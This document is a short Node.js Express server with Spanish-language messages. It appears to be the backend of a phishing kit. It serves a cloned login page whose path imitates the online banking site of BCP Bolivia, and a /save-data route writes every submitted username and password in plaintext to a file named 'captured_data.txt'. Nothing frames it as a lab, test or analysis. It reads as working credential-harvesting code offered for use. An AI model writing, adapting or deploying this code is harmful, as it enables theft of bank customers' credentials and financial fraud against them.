const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

app.post('/save-data', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    const dataToWrite = `Usuario: ${username}, Clave: ${password}\n`;

    const filePath = path.join(__dirname, 'captured_data.txt');
    fs.appendFile(filePath, dataToWrite, (err) => {
        if (err) {
            console.error('Error al escribir en el archivo:', err);
            res.status(500).send('Error al guardar los datos');
        } else {
            res.send('Los datos se han guardado correctamente.');
        }
    });
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}/WEB3/BCP/www.bancaporinternet.bcp.com.bo/Account/Login.html`);
});
